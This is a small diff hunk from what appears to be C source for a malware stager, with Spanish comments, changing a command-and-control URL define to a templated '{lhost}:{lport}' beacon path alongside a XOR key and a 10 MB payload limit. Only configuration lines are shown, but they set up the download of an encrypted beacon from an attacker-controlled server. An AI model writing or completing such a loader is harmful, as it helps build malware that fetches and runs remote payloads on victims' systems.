@@ -7,7 +7,7 @@
 #pragma comment(lib, "crypt32.lib")
 
 // === CONFIGURACIÓN ===
-#define C2_URL "http://{lhost}/beacon.enc"
+#define C2_URL "http://{lhost}:{lport}/s/beacon.enc"
 #define XOR_KEY 0x33
 #define MAX_PAYLOAD_SIZE (1024 * 1024 * 10)  // 10 MB
 
